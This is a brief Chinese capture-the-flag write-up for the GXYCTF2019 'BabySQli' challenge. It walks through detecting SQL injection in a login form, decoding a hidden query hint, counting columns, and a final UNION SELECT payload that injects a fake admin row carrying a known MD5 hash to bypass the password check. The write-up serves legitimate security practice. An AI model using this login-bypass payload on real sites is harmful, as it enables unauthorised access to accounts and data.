二十三、

题目

[GXYCTF2019]BabySQli

分析

name=admin&pw=123———–wrong pass!
name=admin'&pw=123———-报错
name=admin&pw=1'————wrong pass!
说明name存在注入，pw不存在
在search.php页面源码注释中发现：
MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5
base32然后base64解码得到SQL语句
select * from user where username = '$name'
or、=、(、)被过滤，但OR可以
admin' Order by 4#———Error: Unknown column '4' in 'order clause' 说明有三列
1' union select 1,2,3#看回显位，结果是wrong user!
将1改为'admin',还是wrong user；改到第二位，变成了wrong pass，说明admin在第二列

在BUU给的这道题的源码中
arr[1]=='admin'那么arr[2]应该就是输入的pw吧
需要md5($password) == $arr[2]
所以只要传入的pw的MD5等于第三位就行了

如果没有源码的提示，正确的思路应该是利用sql的特性：在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据

解

payload：name=1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#&&pw=123

知识点
